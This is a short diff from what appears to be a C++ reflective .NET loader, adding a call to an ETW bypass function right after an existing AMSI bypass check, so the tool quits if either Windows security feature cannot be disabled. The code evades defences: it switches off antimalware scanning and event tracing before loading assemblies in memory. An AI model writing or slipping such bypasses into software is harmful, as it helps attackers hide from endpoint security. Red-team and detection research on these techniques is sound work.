@@ -190,6 +190,11 @@ void Dotnet(std::wstring FilePath, std::wstring args, bool isRemote, bool https)
 		std::cout << "[-] Failed to bypass AMSI, exiting early\n";
         return;
     };
+    
+    if (!FullEtwBypass()) {
+        std::cout << "[-] Failed to bypass ETW, exiting early\n";
+        return;
+    };
     std::wcout << L"------- Reflective .NET Loader -------\n";
     /*
     if (!patchRemoteETW(mainInjector.process(-1))) {
